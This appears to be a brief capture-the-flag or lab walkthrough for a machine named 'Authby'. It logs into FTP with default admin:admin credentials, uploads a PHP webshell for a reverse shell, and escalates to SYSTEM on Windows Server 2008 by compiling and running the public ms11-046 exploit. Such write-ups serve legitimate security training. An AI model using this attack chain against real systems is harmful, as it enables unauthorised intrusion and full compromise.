# Authby
> ftp admin:admin + ms11-046 (Server 2008)

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

FTP on port 21 with default credentials.

## Exploitation

```
ftp <IP>
# user: admin
# pass: admin
```

Upload webshell via FTP to an accessible web directory.

```
put shell.php
```

Command execution via browser → reverse shell.

## Privilege Escalation

Windows Server 2008 identified. Exploit `ms11-046`:

```
searchsploit ms11-046
```

```
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

```
exploit.exe
```

SYSTEM obtained.
